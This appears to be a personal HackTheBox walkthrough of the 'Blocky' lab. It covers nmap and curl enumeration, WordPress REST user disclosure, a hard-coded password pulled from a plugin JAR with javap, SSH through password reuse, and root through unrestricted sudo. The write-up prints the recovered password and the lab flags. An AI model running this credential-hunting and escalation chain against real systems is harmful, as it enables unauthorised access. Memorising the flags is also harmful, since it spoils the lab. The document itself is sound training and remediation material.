---
tags: [HTB, Blocky, Linux, WordPress, Java, Minecraft, CredentialExposure, PasswordReuse, Sudo, Easy]
platform: HackTheBox
os: Ubuntu 16.04.2 LTS
hostname: Blocky
difficulty: Easy
ip: $BoxIP
status: Complete
domain: blocky.htb
---

# HTB: Blocky, Full Walkthrough

## The gist

Blocky is an easy Linux machine where the public WordPress site leads to an exposed Minecraft plugin directory. The directory listing is backed by a small Java file browser and its scan endpoint discloses BlockyCore.jar. Decompiling the class with javap reveals a hard-coded database credential.

The password is reused by the WordPress author account, notch, which also exists as a Linux user. SSH provides the foothold. Local enumeration shows that notch is a member of sudo and may run every command as every user. Supplying the recovered password to sudo -l and then using sudo -i produces root.

The chain is:

~~~text
WordPress and Minecraft services
  -> WordPress REST API discloses Notch
  -> /plugins/scan.php discloses BlockyCore.jar
  -> javap reveals root / hard-coded password
  -> password reuse gives SSH as notch
  -> notch has (ALL : ALL) ALL through sudo
  -> sudo -i gives root
~~~

> [!warning] Evidence boundary
> The source transcript contains multiple sessions, failed broad content scans, deliberate curl timeouts, a later box reset, and a reconnect using a different instance address. This report labels those failures instead of presenting them as successful techniques. The screenshots, loot, Nmap artifacts, and flags file provide the completed proof.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Ubuntu 16.04.2 LTS |
| Hostname | Blocky |
| Original target supplied | 10.129.1.90 |
| Later reset address in source workspace | 10.129.1.93 |
| Domain | blocky.htb |
| Open services | TCP 21 FTP, 22 SSH, 80 HTTP, 25565 Minecraft |
| Web technology | Apache 2.4.18, WordPress 4.8 |
| Minecraft version | 1.11.2 |
| Initial access | Hard-coded plugin credential reused by notch |
| Privilege path | Unrestricted sudo |

## Vulnerability summary

| # | Vulnerability or misconfiguration | Severity | Location |
|---|---|---|---|
| 1 | Public plugin browser exposes application artifacts | Medium | http://blocky.htb/plugins/ |
| 2 | Java plugin contains a hard-coded database credential | High | BlockyCore.jar |
| 3 | Password is reused by a Linux/WordPress user | High | notch |
| 4 | User can run all commands through sudo | Critical | sudoers entry for notch |

## Evidence and loot

The source workspace was read from:

/home/kali/Platforms/HackTheBox/Blocky/

| Evidence | Source location |
|---|---|
| Raw command transcript | Blocky.log |
| Current variables and recovered credential | .env |
| Full TCP scan | nmap/allports.nmap and nmap/allports.* |
| Service scan | nmap/services.nmap and nmap/services.* |
| Failed broad scans | nmap/gobuster.txt, nmap/ferox.txt, and Blocky.log |
| WordPress landing page and headers | loot/http-root.html, loot/http-root.headers |
| WordPress user enumeration | loot/wp-users.json |
| Plugin browser | loot/plugins.html |
| Plugin scan response | loot/plugins-scan.json |
| Decompiled Java class | loot/BlockyCore.jar, loot/BlockyCore-javap.txt |
| Flag values | loot/flags.txt |
| Visual evidence | screenshots/1.nmap-allports.png through 9.sudo-l.png |

The screenshot files remain in the source workspace. They are referenced below by filename only so they can be placed wherever desired without creating a screenshot section or copying them into the vault.

## Variables

~~~bash
boxset BoxName Blocky
boxset BoxIP $BoxIP
boxset LocalIP $LocalIP
boxset Domain blocky.htb
boxset URL http://blocky.htb/
boxset WebPort 80
boxset OpenPorts "21,22,80,25565"
boxset Username notch
boxset Password $Password
boxset PluginFile $BoxDir/loot/BlockyCore.jar
boxset PluginClass com.myfirstplugin.BlockyCore
~~~

The source .env records the later reset address as 10.129.1.93, while the original box request and first run used 10.129.1.90. Use the active value of $BoxIP during a live run.

## 1. Initialise the session and preserve evidence

The normal box helpers create the source workspace, variables, and transcript. In a clean reproduction, keep the local working files in the isolated temporary workspace described by the agent workflow; the path above is the completed source evidence location.

~~~bash
boxstart Blocky $BoxIP htb
htblog
mkdir -p "$BoxDir"/{nmap,loot,notes}
~~~

The captured run was closed with boxdone. No target-side payload, account, scheduled task, or service modification was created.

## 2. Scan every TCP port

The full scan found FTP, SSH, HTTP, and Minecraft. Port 8192 was closed and was not part of the service path.

~~~bash
sudo nmap -Pn -p- --min-rate 1000 \
  -oA "$BoxDir/nmap/allports" "$BoxIP"
~~~

Observed output:

~~~text
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
8192/tcp  closed sophos
25565/tcp open   minecraft
~~~

SCREENSHOT: 1.nmap-allports.png — full TCP scan showing FTP, SSH, HTTP, and Minecraft.

> [!abstract] What matters
> The combination of WordPress on 80 and Minecraft on 25565 is more useful than either service alone. A Minecraft server often has plugin files, while the web service may expose those files or related development content.

## 3. Identify service versions

Run the focused scan only against the discovered open ports.

~~~bash
sudo nmap -Pn -sC -sV \
  -p21,22,80,25565 \
  -oA "$BoxDir/nmap/services" "$BoxIP"
~~~

The important results were:

- OpenSSH 7.2p2 on port 22
- Apache 2.4.18 on port 80
- WordPress 4.8 identified by Nmap
- Minecraft 1.11.2 on port 25565
- Linux service information pointing to Ubuntu

SCREENSHOT: 2.nmap-services.png — focused service scan with SSH, Apache/WordPress, and Minecraft versions.

> [!hint] Branch decision
> The Minecraft service is not attacked directly. Its presence explains why a plugin directory is valuable, while the web service is the practical discovery surface.

## 4. Configure the web hostname

Apache redirected the site to blocky.htb. Preserve the original hosts file before adding the mapping.

~~~bash
sudo cp -a /etc/hosts "$BoxDir/notes/hosts.before"
printf '%s\n' "$BoxIP blocky.htb" | sudo tee -a /etc/hosts
~~~

Confirm the mapping:

~~~bash
getent hosts blocky.htb
~~~

Do not forget that the source transcript contains a later reset where the mapping changed from 10.129.1.90 to 10.129.1.93.

## 5. Check FTP, then fingerprint the web service

Anonymous FTP did not provide a useful listing. The request deliberately timed out after 15 seconds and produced an empty loot file.

~~~bash
curl -sS --max-time 15 \
  --list-only \
  ftp://anonymous:anonymous@$BoxIP/ \
  | tee "$BoxDir/loot/ftp-anon.txt"
~~~

Request the HTTP headers and homepage:

~~~bash
curl -sS --max-time 30 -I \
  http://blocky.htb/ \
  | tee "$BoxDir/loot/http-root.headers"

curl -sS --max-time 30 \
  http://blocky.htb/ \
  -o "$BoxDir/loot/http-root.html"
~~~

Inspect the saved page:

~~~bash
grep -inE 'WordPress|generator|wp-content|wp-json|wp-login|plugin|Minecraft' \
  "$BoxDir/loot/http-root.html"
~~~

The response identified:

- BlockyCraft, an under-construction WordPress site
- WordPress 4.8
- The REST API link at /index.php/wp-json/
- A Minecraft-themed site and plugin-development language

SCREENSHOT: 3.wp-json.png — HTTP headers disclosing the WordPress REST API path.

### Content discovery and the slow-response gotcha

The first Gobuster run timed out. A lower-thread second run also timed out. Feroxbuster failed to connect during its run. These results were preserved as negative evidence rather than treated as proof that the VPN or route was broken.

~~~bash
gobuster dir \
  -u http://blocky.htb/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt \
  -t 10 \
  --timeout 30s \
  -o "$BoxDir/nmap/gobuster.txt"
~~~

~~~bash
feroxbuster \
  -u http://blocky.htb/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 1 \
  --timeout 30 \
  -o "$BoxDir/nmap/ferox.txt"
~~~

> [!warning] Slow curl responses are not automatically VPN failure
> In this run, some requests to the WordPress API and author endpoint took longer than the chosen timeout, while direct known paths such as /plugins/ and /plugins/scan.php eventually responded. The delay was consistent with a slow application/API path rather than a dead tunnel. Before restarting OpenVPN, confirm the route with Nmap, request a known path with a longer --max-time, reduce scanner concurrency, and measure time-to-first-byte:

~~~bash
curl -sS --max-time 60 \
  -o /dev/null \
  -w 'code=%{http_code} connect=%{time_connect} start=%{time_starttransfer} total=%{time_total}\n' \
  http://blocky.htb/plugins/scan.php
~~~

## 6. Enumerate WordPress users through the REST API

The root REST path returned a 404, but the index.php rewrite path worked after a longer request. Save the JSON before interpreting it.

~~~bash
curl -sS --max-time 60 \
  'http://blocky.htb/index.php/wp-json/wp/v2/users' \
  | tee "$BoxDir/loot/wp-users.json"
~~~

Format the result:

~~~bash
python3 -m json.tool "$BoxDir/loot/wp-users.json"
~~~

The API disclosed the author:

~~~text
name: Notch
slug: notch
link: /index.php/author/notch/
~~~

The direct ?author=1 request was slower and timed out in the source transcript. The successful REST response was the reliable evidence for the username.

SCREENSHOT: 6.wp-users.png — REST API user disclosure and the saved notch username.

> [!warning] REST-path gotcha
> Test both /wp-json/ and /index.php/wp-json/ when WordPress is using an index front controller. A 404 on the first path does not rule out the API.

## 7. Inspect the exposed plugin browser

Request the directory and its JavaScript before guessing filenames. The HTML itself is only a file-browser shell; the JavaScript identifies scan.php as the data endpoint.

~~~bash
curl -sS --max-time 60 \
  http://blocky.htb/plugins/ \
  | tee "$BoxDir/loot/plugins.html"

curl -sS --max-time 60 \
  http://blocky.htb/plugins/assets/js/script.js \
  | grep -iE 'ajax|fetch|url|api|scan|json'
~~~

Request the discovered endpoint:

~~~bash
curl -sS --max-time 60 \
  http://blocky.htb/plugins/scan.php \
  | tee "$BoxDir/loot/plugins-scan.json"
~~~

The JSON response listed:

~~~text
files/BlockyCore.jar
files/griefprevention-1.11.2-3.1.1.298.jar
~~~

SCREENSHOT: 4.plugins-scan.png — scan.php listing the two Minecraft plugin JARs.

> [!abstract] What to focus on
> A directory listing is not only a path-discovery result. It identifies application artifacts that may contain connection strings, credentials, API keys, or comments. The small custom JAR is the priority because it is more likely to contain site-specific code than the large third-party dependency.

## 8. Download and analyse BlockyCore.jar

Download the custom plugin and preserve the original.

~~~bash
curl -sS --max-time 60 \
  http://blocky.htb/plugins/files/BlockyCore.jar \
  -o "$BoxDir/loot/BlockyCore.jar"

sha256sum "$BoxDir/loot/BlockyCore.jar"
jar tf "$BoxDir/loot/BlockyCore.jar" \
  | tee "$BoxDir/loot/BlockyCore-contents.txt"
~~~

The JAR contained one application class:

~~~text
com/myfirstplugin/BlockyCore.class
~~~

Use javap to inspect the bytecode and constant strings:

~~~bash
javap \
  -classpath "$BoxDir/loot/BlockyCore.jar" \
  -c -p \
  com.myfirstplugin.BlockyCore \
  | tee "$BoxDir/loot/BlockyCore-javap.txt"
~~~

The constructor assigns:

~~~text
sqlHost = localhost
sqlUser = root
sqlPass = [private recovered value]
~~~

The credential is described as a database credential, but it must also be tested for password reuse against the disclosed system username. Do not assume that a credential's variable name limits where it can work.

SCREENSHOT: 5.blockycode-decompile.png — javap output showing the hard-coded root database username and password.

> [!tip] Java analysis shortcut
> A full GUI decompiler was unnecessary. jar tf identified the class, and javap -c -p exposed the constructor constants directly. Use heavier decompilation only if bytecode control flow or string references cannot be understood from javap.

## 9. Record the credential and authenticate over SSH

Store the recovered credential privately, then validate it once against the disclosed username.

~~~bash
boxset Username notch
boxset Password [private recovered value]
loot cred $Username $Password
~~~

Connect to SSH:

~~~bash
ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile="$BoxDir/loot/known_hosts" \
  "$Username@$BoxIP"
~~~

Enter the recovered password when prompted. The login banner confirmed Ubuntu 16.04.2 LTS and the hostname Blocky.

SCREENSHOT: 7.ssh-notch.png — successful SSH authentication as notch.

## 10. Enumerate the local account and sudo boundary

Immediately confirm the shell identity, host, operating system, groups, and sudo policy.

~~~bash
id
hostname
uname -a
pwd
sudo -l
~~~

The decisive findings were:

- User: notch
- Hostname: Blocky
- Kernel: Linux 4.4.0-62-generic x86_64
- Group membership includes sudo and lxd
- Sudo permits (ALL : ALL) ALL

SCREENSHOT: 8.id-notch.png — notch identity and group membership, including sudo.

SCREENSHOT: 9.sudo-l.png — unrestricted sudo rule.

> [!warning] Do not chase the distracting group first
> The lxd group is interesting in other contexts, but unrestricted sudo is already a direct, password-validated root path. Use the shortest verified escalation and document the unused alternatives as decision points.

## 11. Escalate to root

The sudo rule requires the recovered password but imposes no command restriction.

~~~bash
sudo -i
id
whoami
hostname
~~~

The resulting shell has UID 0 and confirms root access. No kernel exploit was required.

The CVE-2017-6074 reference in the machine description was not part of the completed route. Version-specific kernel exploitation would have been unnecessary after sudo -l disclosed unrestricted command execution.

## 12. Confirm the flags privately

Read and store the proof values only in the private box loot. They are not reproduced in chat.

~~~bash
cat /home/notch/user.txt
cat /root/root.txt
loot flag user [value from /home/notch/user.txt]
loot flag root [value from /root/root.txt]
~~~

The source workspace already contains the captured values in loot/flags.txt.

## 13. Decision points and gotchas

| Observation | Decision |
|---|---|
| The original target was 10.129.1.90, but the later source .env and screenshots use 10.129.1.93 | Treat the IP as an instance-specific variable and use the active $BoxIP. Do not mix old and reset artifacts without labelling them. |
| FTP anonymous listing timed out | Record the negative result and continue with HTTP; do not interpret one service timeout as a VPN failure. |
| Gobuster and Feroxbuster timed out or failed to connect | Reduce concurrency, increase timeout, save the failure, and request promising paths manually. |
| Some curl requests took more than 30 seconds | The web/API path was slow. Confirm TCP reachability and measure response timing before restarting OpenVPN. |
| Root WordPress REST path returned 404 | Use /index.php/wp-json/wp/v2/users, which worked. |
| ?author=1 was slow | Use the successful REST response as the username evidence rather than retrying the same slow endpoint indefinitely. |
| /plugins/ returned a file-browser shell | Read its JavaScript and request scan.php directly. |
| The plugin credential was labelled sqlPass | Validate it for password reuse; a database credential can also be a system password. |
| JAR contained one custom class | javap was sufficient; a GUI decompiler was not required. |
| notch belonged to sudo and lxd | Use unrestricted sudo first; do not introduce an unnecessary LXD branch. |
| The description mentioned CVE-2017-6074 | Do not pursue a generic kernel exploit after a direct sudo path is proven. |

## 14. RUNBOOK V2 Stages Used

| Stage | How Blocky used it |
|---|---|
| [[OSCP/RUNBOOK V2/Start Here\|Start Here]] | Created the evidence workspace, transcript, and variables |
| [[OSCP/RUNBOOK V2/Linux - Service Scan\|Linux - Service Scan]] | Identified Apache/WordPress, SSH, FTP, and Minecraft |
| [[OSCP/RUNBOOK V2/Linux - Web Enum\|Linux - Web Enum]] | Reviewed headers, REST paths, plugin browser, scanner failures, and response timing |
| [[OSCP/RUNBOOK V2/Linux - CMS Check\|Linux - CMS Check]] | Confirmed WordPress 4.8 and used the REST API for user enumeration |
| [[OSCP/RUNBOOK V2/Linux - Binary Analysis\|Linux - Binary Analysis]] | Listed the JAR and inspected Java bytecode with javap |
| [[OSCP/RUNBOOK V2/Linux - Credential Search\|Linux - Credential Search]] | Treated the compiled plugin as a credential-bearing application artifact and validated reuse |
| [[OSCP/RUNBOOK V2/Linux - Local Enum\|Linux - Local Enum]] | Confirmed identity, group membership, kernel, and privilege branches |
| [[OSCP/RUNBOOK V2/Linux - Sudo Check\|Linux - Sudo Check]] | Confirmed (ALL : ALL) ALL and used sudo -i |
| [[OSCP/RUNBOOK V2/Linux - Clean Down\|Linux - Clean Down]] | Restored the local hosts entry, closed shells, retained loot, and recorded boxdone |

## 15. Collect the flags

- user.txt -- confirmed under /home/notch/user.txt
- root.txt -- confirmed under /root/root.txt

### Captured flag values from source loot

The following private values are reproduced from /home/kali/Platforms/HackTheBox/Blocky/loot/flags.txt for the vault record.

~~~text
user: 6d4eec4cba4543b443286a3391f7b7b4
root: 82c2dd295a3e6340fe441cdefeb90f08
~~~

## 16. Clean down

The completed route did not create target-side payloads, accounts, scheduled tasks, or persistent files. The local run did add a hosts entry and should remove it before closing.

~~~bash
sudo cp -a "$BoxDir/notes/hosts.before" /etc/hosts
grep -n 'blocky' /etc/hosts || true
~~~

Close the target shells:

~~~bash
exit
exit
boxdone
~~~

The source transcript records boxdone. On a clean run, confirm that the target has no listener or uploaded artifact before closing the session.

> [!warning] Cleanup boundary
> Restoring /etc/hosts is a Kali-side action, not a target cleanup. Do not delete the downloaded JAR, decompilation output, screenshots, or flags from private loot; they are evidence, not target persistence.

## Attack narrative in one page

1. Nmap found FTP, SSH, Apache/WordPress, and Minecraft.
2. The web site identified WordPress 4.8 and exposed its REST API.
3. The REST API disclosed the Notch username.
4. The public plugin browser exposed a custom BlockyCore JAR.
5. javap recovered a hard-coded database credential.
6. The same password worked for SSH as notch.
7. Local enumeration showed notch was in sudo and could run (ALL : ALL) ALL.
8. sudo -i produced a root shell.
9. The source flags were recorded privately and local cleanup was completed.

## Tools used

| Tool | Purpose |
|---|---|
| nmap | Full TCP and service enumeration |
| curl | HTTP headers, WordPress REST, plugin browser, scan endpoint, and timing checks |
| gobuster | Initial web content discovery; preserved timeout result |
| feroxbuster | Low-thread fallback; preserved connection failure |
| jar | List Java archive contents |
| javap | Inspect compiled Java bytecode and constructor constants |
| ssh | Validate password reuse and obtain the Linux foothold |
| sudo | Confirm and use unrestricted privilege delegation |

## Credentials and secrets

| Account or value | Credential | Source or use |
|---|---|---|
| WordPress author | notch | WordPress REST API slug |
| Plugin database user | root | BlockyCore constructor |
| Plugin database password | 8YsqfCTnvxAUeduzjNSXe22 | BlockyCore constructor; reused by notch |
| Linux user | notch | SSH foothold |

### Captured private values from source loot

These values are retained because this is a private vault. The source path remains authoritative if a value appears truncated.

#### .env

~~~text
export BoxName="Blocky"
export BoxIP="10.129.1.93"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Blocky"
export Username=notch
export Password=8YsqfCTnvxAUeduzjNSXe22
export WebPort="80"
~~~

#### loot/flags.txt

~~~text
user: 6d4eec4cba4543b443286a3391f7b7b4
root: 82c2dd295a3e6340fe441cdefeb90f08
~~~

## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Public plugin directory | Remove directory indexing and prevent public access to server-side plugin artifacts |
| Hard-coded Java credential | Remove credentials from source, use a secret manager or protected configuration, and rotate the exposed password |
| Password reuse | Use unique random credentials for database, WordPress, and operating-system accounts |
| Unrestricted sudo | Remove the all-command rule and grant only the exact administrative commands required |
| Legacy services | Patch or retire unsupported Ubuntu, Apache, WordPress, SSH, and Minecraft components |
| WordPress disclosure | Restrict user enumeration and review REST API exposure where it is not needed |

## Lessons learned and vault links

- A Minecraft service can be an indirect clue to inspect web-exposed plugin artifacts.
- A small Java archive may contain more useful application-specific information than a large third-party dependency.
- javap is a fast first-pass tool for Java constant and credential review.
- Scanner timeouts are evidence about the application and tool settings, not automatically evidence of a broken VPN.
- Validate password reuse once, then follow the confirmed local privilege boundary.
- When both lxd and unrestricted sudo appear, take the direct verified route and record the unused branch.

### Related hub docs

- [[OSCP COMMAND MASTER CHEATSHEET|Command Master Cheatsheet]]
- [[OSCP/COMMAND APPENDIX/Web Applications|Web Applications Command Appendix]]
- [[OSCP/COMMAND APPENDIX/Linux Privilege Escalation|Linux Privilege Escalation Command Appendix]]
- [[OSCP/DECISION TREE/Reconnaissance & Enumeration (Decision Tree)|Reconnaissance and Enumeration Decision Tree]]
- [[OSCP/DECISION TREE/Web Applications (Decision Tree)|Web Applications Decision Tree]]
- [[OSCP/DECISION TREE/Secrets & Credentials (Decision Tree)|Secrets and Credentials Decision Tree]]
- [[OSCP/DECISION TREE/Linux Privilege Escalation (Decision Tree)|Linux Privilege Escalation Decision Tree]]
- [[OSCP/MODULES/06. Information Gathering|Module 6 - Information Gathering]]
- [[OSCP/MODULES/08. Introduction to Web Application Attacks|Module 8 - Web Application Attacks]]
- [[OSCP/MODULES/09. Common Web Application Attacks|Module 9 - Common Web Application Attacks]]
- [[OSCP/MODULES/18. Linux Privilege Escalation|Module 18 - Linux Privilege Escalation]]

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Mirai\|Mirai]] -- IoT service fingerprinting and default-credential validation
- [[OSCP/BOXES/WRITE UPS/Linux/DevOops\|DevOops]] -- source-driven application analysis and credential recovery
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles\|Nibbles]] -- CMS enumeration leading to Linux access
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin\|OpenAdmin]] -- web enumeration, credential reuse, SSH, and sudo escalation
- [[OSCP/BOXES/WRITE UPS/Linux/Covfefe\|Covfefe]] -- exposed application files and source-driven local escalation

## External resources

- [WordPress REST API user reference](https://developer.wordpress.org/rest-api/reference/users/)
- [Java javap documentation](https://docs.oracle.com/en/java/javase/22/docs/specs/man/javap.html)
- [OWASP hard-coded passwords guidance](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)
- [GTFOBins sudo](https://gtfobins.github.io/gtfobins/sudo/)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - CMS Check]]
- [[OSCP/RUNBOOK V2/Linux - Binary Analysis]]
- [[OSCP/RUNBOOK V2/Linux - Credential Search]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Sudo Check]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

Blocky rewards a disciplined transition from service enumeration to artifact analysis. The machine is not solved by attacking WordPress or Minecraft directly; it is solved by reading the evidence, identifying a credential in compiled application code, validating reuse once, and stopping at the first confirmed unrestricted privilege boundary.
